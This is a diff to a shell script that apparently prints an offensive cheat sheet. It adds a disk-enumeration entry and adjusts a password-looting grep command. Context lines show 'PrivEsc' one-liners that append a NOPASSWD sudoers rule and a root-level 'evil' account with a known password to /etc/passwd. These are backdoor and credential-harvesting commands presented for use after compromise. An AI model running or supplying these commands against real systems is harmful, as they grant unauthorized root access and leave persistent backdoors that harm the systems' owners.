@@ -28,7 +28,12 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Looting for Passwords${End} ${Frame}###${End}"
-echo -e "${Point} grep --color=auto -rn './' -ie \"pass\" --color=always 2>/dev/null"
+echo -e "grep --color=auto -rn './' -ie \"pass\" --color=always 2>/dev/null"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Disks Enumeration${End} ${Frame}###${End}"
+echo -e "${Point} fdisk -l"
 echo -e ""
 
 
@@ -37,3 +42,5 @@ echo -e "${Frame}###${End} ${Title}Linux PrivEsc Oneliner-Kill${End} ${Frame}###
 echo -e "${Point} echo \"<user> ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
 echo -e "${Point} echo \"evil:\$(openssl passwd -1 evil):0:0:root:/root:/bin/bash\" >> /etc/passwd"
 echo -e ""
+
+
